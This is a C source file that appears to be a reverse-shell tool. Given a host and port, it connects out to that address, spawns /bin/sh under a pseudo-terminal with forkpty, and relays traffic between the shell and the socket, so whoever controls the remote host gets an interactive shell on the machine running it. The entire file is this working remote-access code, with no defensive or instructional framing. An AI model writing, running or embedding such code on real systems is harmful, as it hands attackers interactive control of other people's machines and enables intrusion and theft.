#include <pty.h>
#include <sys/select.h>
#include <unistd.h>

#include <stdio.h>
#include <stdlib.h>

#include "util.h"

static int copy_loop(int fd1, int fd2) {
  plog("%d, %d", fd1, fd2);
  for (;;) {
    fd_set set;
    FD_ZERO(&set);
    FD_SET(fd1, &set);
    FD_SET(fd2, &set);
    if (select(max(fd1, fd2) + 1, &set, NULL, NULL, NULL) <= 0) {
      return -2;
    }
    int read_fd = 0, write_fd = 0;
    if (FD_ISSET(fd1, &set)) {
      read_fd = fd1;
      write_fd = fd2;
    } else if (FD_ISSET(fd2, &set)) {
      read_fd = fd2;
      write_fd = fd1;
    }
    int read_bytes = copy_data(read_fd, write_fd);
    if (read_bytes < 0) {
      return read_bytes;
    }
  }
}

int main(int argc, char **argv, char **envp) {
  if (argc < 3) {
    printf("Usage: %s [host] [port]\n", argv[0]);
    return -1;
  }
  int port = atoi(argv[2]);
  int socket_fd = 0, master_fd = 0;
  if ((socket_fd = get_socket_connect(argv[1], port)) <= 0) {
    return -2;
  }
  // Use forkpty to handle communication between pty master and socket
  int pid = forkpty(&master_fd, NULL, NULL, NULL);
  if (pid < 0) {
    return -3;
  } else if (pid != 0) {
    // Parent
    copy_loop(master_fd, socket_fd);
  } else {
    // Child
    execve("/bin/sh", NULL, NULL);
    exit(0);
  }
  return 0;
}